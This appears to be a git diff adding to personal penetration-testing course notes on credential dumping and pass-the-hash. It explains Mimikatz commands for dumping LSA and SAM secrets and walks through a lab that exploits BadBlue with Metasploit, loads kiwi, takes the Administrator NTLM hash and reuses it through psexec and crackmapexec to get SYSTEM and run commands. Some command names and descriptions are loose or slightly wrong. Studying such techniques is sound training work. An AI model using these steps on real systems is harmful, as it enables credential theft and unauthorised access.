@@ -684,7 +684,13 @@ Demo
 				null means cleartext passwords have been disabled 
 		- 
 
-
+1. **"lsa_dump_all"** is a Kiwi command in Mimikatz that is used to dump various types of information from the Local Security Authority (LSA) subsystem. It retrieves data such as secrets, cached credentials, security packages, and other relevant information stored in the LSA.
+    
+2. **"sekurlsa::logonpasswords"** is a Mimikatz command that retrieves plaintext passwords and password hashes for active logon sessions on the target system. It leverages the functionality of the Security Account Manager (SAM) and the Local Security Authority Subsystem Service (LSASS) to extract this information from memory.
+    
+3. **"lsadump::sam"** is a Mimikatz command that specifically focuses on dumping the Security Account Manager (SAM) database from the target system. The SAM database stores user account information, including usernames and password hashes. By executing this command, Mimikatz extracts the password hashes stored in the SAM database.
+    
+4. **"sekurlsa::sam"** is a Mimikatz command that extracts password hashes from the Security Account Manager (SAM) database in memory. It specifically targets the SAM and retrieves the password hashes, allowing further analysis, cracking, or other security-related activities.
 
 
 
@@ -699,3 +705,47 @@ Pass-THe-Hash
 	+ Crackmapexec
 - This technique will allow us to obtain access to the target system via legitimate
 	credentials as opposed to obtaining access via service exploitation
+
+Why is this important? you already have access? What if it is patched or firewall rule is enabled then you cannot exploit that service anymore? If you had a hash you could still exploit that service even if original vulnerable service has been patched or disabled 
+
+Demo 
+
+- turn on a msfconsole: 
+	- search badblue 
+	- use passtru, set rhost and exploit 
+- meterpreter session on target system
+	- pgrep lsass - migrate 
+	- get uid 
+	- load kiwi 
+	- lsa_dump_sam 
+	- take the administrator NTLM hash and put it in a textfile 
+
+- how to perform password hash attack - you need ntlm and lm hash
+	- hashdump 
+	- put the meterpreter in the background with control + Z 
+- Search psexec 
+	- use ![[Pasted image 20230707142752.png]]
+					for this module you need credentials
+		- use default payload 
+		- type session: to check what port the session is using; make sure the lport matches with the session running in the back
+		- set smbuser Administrator 
+		- set smbpass {paste the hash}
+		- set target 
+			-  set target Native\\ upload   
+		- now you have a meterpreter session with elevated privileges 
+			- sysinfo 
+			- getuid 
+			- now you have authority\\system privileges' 
+			  
+Above we used psexec for pas the hash attack but you can also use other tools such as: crackmapexe
+
+- crackmapexec smb targetip -u Administrator -H "{hash}"
+- try to execute commands
+	- crackmapexec smb targetip -u Administrator -H "{hash}" -x "ipconfig"
+	- crackmapexec smb targetip -u Administrator -H "{hash}" -x "net user"
+
+
+
+In summary, CrackMapExec is focused on password auditing and Windows network exploitation, Evil-WinRM enables remote command execution on Windows systems, Cadaver is used for interacting with WebDAV servers, and msfvenom is a payload generator for creating malicious payloads within the Metasploit Framework. 
+
+
